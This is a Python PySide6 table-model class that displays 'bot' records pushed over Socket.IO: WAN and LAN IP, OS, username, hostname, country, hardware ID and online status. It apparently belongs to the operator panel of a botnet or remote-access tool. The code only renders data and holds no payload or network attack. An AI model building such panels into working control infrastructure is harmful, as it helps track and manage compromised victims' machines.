import datetime
from PySide6.QtCore import QAbstractTableModel, Qt, QModelIndex
from PySide6.QtWidgets import QApplication, QTableView


class BotTableModel(QAbstractTableModel):
    def __init__(self, socket_io_client, parent=None):
        super().__init__(parent)
        self.internal_data = []
        self._socket_io_client = socket_io_client
        self._header = ["id", "socketId", "wanIp", "lanIp", "os", "username", "hostname", "country", "lastSeen", "hwid", "online"]

        self._socket_io_client.panel_received_bot_data.connect(self.refresh)

    def rowCount(self, parent=QModelIndex()):
        return len(self.internal_data)

    def columnCount(self, parent=QModelIndex()):
        return len(self._header)

    def data(self, index, role=Qt.DisplayRole):
        if not index.isValid():
            return None
        row = index.row()
        col = index.column()
        if role == Qt.DisplayRole:
            if col == 8:
                iso_date_string = str(self.internal_data[row][self._header[col]])
                iso_date = datetime.datetime.fromisoformat(iso_date_string)
                new_format = iso_date.strftime("%Y-%m-%d %H:%M:%S")
                return new_format
            return str(self.internal_data[row][self._header[col]])
        return None

    def headerData(self, section, orientation, role) :
        if( role == Qt.DisplayRole):
            if(orientation == Qt.Horizontal):
                if(section == 0) : return "ID"
                if(section == 1) : return "SocketID"
                if(section == 2) : return "WAN-IP"
                if(section == 3) : return "LAN-IP"
                if(section == 4) : return "OS"
                if(section == 5) : return "USERNAME"
                if(section == 6) : return "HOSTNAME"
                if(section == 7) : return "COUNTRY"
                if(section == 8) : return "LAST SEEN"
                if(section == 9) : return "HWID"
                if(section == 10) : return "ONLINE"
        # return super().headerData(section, orientation, role)
    
    def refresh(self, data):
        # update the model with new data
        self.internal_data = data
        self.layoutChanged.emit()